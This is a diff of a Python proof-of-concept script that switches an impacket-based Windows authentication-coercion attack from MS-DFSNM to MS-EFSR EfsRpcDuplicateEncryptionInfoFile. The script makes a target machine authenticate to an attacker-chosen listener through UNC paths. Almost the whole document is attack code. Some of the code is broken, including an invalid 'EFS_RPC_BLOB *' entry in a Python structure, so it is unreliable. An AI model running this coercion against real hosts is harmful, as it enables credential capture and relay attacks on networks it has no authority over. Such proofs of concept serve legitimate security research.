@@ -2,12 +2,11 @@
 # -*- coding: utf-8 -*-
 # File name          : coerce_poc.py
 # Author             : Podalirius (@podalirius_)
-# Date created       : 22 Jun 2022
+# Date created       : 01 July 2022
 
 
 import sys
 import argparse
-import random
 from impacket import system_errors
 from impacket.dcerpc.v5 import transport
 from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
@@ -30,24 +29,20 @@ class DCERPCSessionError(DCERPCException):
             return 'SessionError: unknown error code: 0x%x' % self.error_code
 
 
-def gen_random_name(length=8):
-    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-    name = ""
-    for k in range(length):
-        name += random.choice(alphabet)
-    return name
-
-
-class NetrDfsRemoveStdRoot(NDRCALL):
+class EfsRpcDuplicateEncryptionInfoFile(NDRCALL):
     opnum = 13
     structure = (
-        ('ServerName', WSTR),  # Type: WCHAR *
-        ('RootShare', WSTR),   # Type: WCHAR *
-        ('ApiFlags', DWORD)    # Type: DWORD
+        ('binding_h', HANDLE_T), # Type: handle_t
+        ('SrcFileName', WSTR), # Type: wchar_t *
+        ('DestFileName', WSTR), # Type: wchar_t *
+        ('dwCreationDisposition', DWORD), # Type: DWORD
+        ('dwAttributes', DWORD), # Type: DWORD
+        ('RelativeSD', EFS_RPC_BLOB *), # Type: EFS_RPC_BLOB *
+        ('bInheritHandle', BOOL), # Type: BOOL
     )
 
 
-class NetrDfsRemoveStdRootResponse(NDRCALL):
+class EfsRpcDuplicateEncryptionInfoFileResponse(NDRCALL):
     structure = ()
 
 
@@ -86,6 +81,8 @@ class RPCProtocol(object):
             self.__rpctransport.setRemoteHost(targetIp)
 
         self.dce = self.__rpctransport.get_dce_rpc()
+        self.dce.set_auth_type(RPC_C_AUTHN_WINNT)
+        self.dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
 
         print("[>] Connecting to %s ... " % self.ncan_target, end="")
         sys.stdout.flush()
@@ -112,19 +109,45 @@ class RPCProtocol(object):
         return True
 
 
-class MS_DFSNM(RPCProtocol):
-    uuid = "4fc742e0-4a10-11cf-8273-00aa004ae673"
-    version = "3.0"
-    pipe = r"\PIPE\netdfs"
+class MS_EFSR(RPCProtocol):
+    uuid = "c681d488-d850-11d0-8c52-00c04fd90f7e"
+    version = "1.0"
+    pipe = r"\pipe\efsrpc"
 
-    def NetrDfsRemoveStdRoot(self, listener):
+    def EfsRpcDuplicateEncryptionInfoFile(self, listener):
         if self.dce is not None:
-            print("[>] Calling NetrDfsRemoveStdRoot() ...")
+            print("[>] Calling EfsRpcDuplicateEncryptionInfoFile() ...")
             try:
-                request = NetrDfsRemoveStdRoot()
-                request['ServerName'] = '%s\x00' % listener
-                request['RootShare'] = gen_random_name() + '\x00'
-                request['ApiFlags'] = 1
+                request = EfsRpcDuplicateEncryptionInfoFile()
+
+            
+                request['binding_h'] = None
+            
+
+            
+                request['SrcFileName'] = '\\\\%s\\share\\file.txt\x00' % listener
+            
+
+            
+                request['DestFileName'] = '\\\\%s\\share\\file.txt\x00' % listener
+            
+
+            
+                request['dwCreationDisposition'] = None
+            
+
+            
+                request['dwAttributes'] = None
+            
+
+            
+                request['RelativeSD'] = None
+            
+
+            
+                request['bInheritHandle'] = None
+            
+
                 # request.dump()
                 resp = self.dce.request(request)
             except Exception as e:
@@ -134,8 +157,8 @@ class MS_DFSNM(RPCProtocol):
 
 
 if __name__ == '__main__':
-    print("Windows auth coerce using MS-DFSNM::NetrDfsRemoveStdRoot()\n")
-    parser = argparse.ArgumentParser(add_help=True, description="Proof of concept for coercing authentication with MS-DFSNM::NetrDfsRemoveStdRoot()")
+    print("Windows auth coerce using MS-EFSR::EfsRpcDuplicateEncryptionInfoFile() - by @podalirius_\n")
+    parser = argparse.ArgumentParser(add_help=True, description="Proof of concept for coercing authentication with MS-EFSR::EfsRpcDuplicateEncryptionInfoFile()")
 
     parser.add_argument("-u", "--username", default="", help="Username to authenticate to the endpoint.")
     parser.add_argument("-p", "--password", default="", help="Password to authenticate to the endpoint. (if omitted, it will be asked unless -no-pass is specified)")
@@ -161,7 +184,7 @@ if __name__ == '__main__':
 
         options.password = getpass("Password:")
 
-    protocol = MS_DFSNM()
+    protocol = MS_EFSR()
 
     connected = protocol.connect(
         username=options.username,
@@ -176,6 +199,6 @@ if __name__ == '__main__':
     )
 
     if connected:
-        protocol.NetrDfsRemoveStdRoot(options.listener)
+        protocol.EfsRpcDuplicateEncryptionInfoFile(options.listener)
 
     sys.exit()
